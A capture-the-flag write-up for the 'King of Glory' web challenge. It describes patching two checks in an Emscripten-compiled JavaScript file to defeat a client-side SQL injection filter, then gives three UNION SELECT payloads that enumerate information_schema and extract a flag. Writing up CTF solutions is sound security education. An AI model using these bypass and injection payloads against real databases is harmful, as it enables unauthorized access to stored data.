King of Glory is a funny game. Our website has a list of players.
http://202.120.7.213:11181

Solve:
The goal here is to bypass client side sqli check, we need to patch the functionn.js to make it work for us to generate valid hash for our id.
In order to patch this, I opened 2 chrome tab, and debug the js being executed for:
Module.main(1);
and Module.main('q');

It turns out that the second query failed to pass the check in #7633 and #7659
after patch them with adding:
$13 = true;
$25 = true;

Module.main('q') will generate valid hash for us.
After that it is just simple sql injection.

I also created a nodejs file to make it easier.

<pre>
<code>
node test.js "100 union select 1,CONCAT(table_name,0x20) FROM information_schema.tables -- "
gave us table name: fl4g
</code>
</pre>

<pre><code>
node test.js "100 union select 1,CONCAT(column_name,0x20) FROM information_schema.columns WHERE table_name = 'fl4g' -- "
gave us column name: hey
</code>
</pre>

<pre><code>
node test.js "100 union select 1,hey from fl4g -- "
gave us flag: flag{emScripten_is_Cut3_right?}
</code></pre>
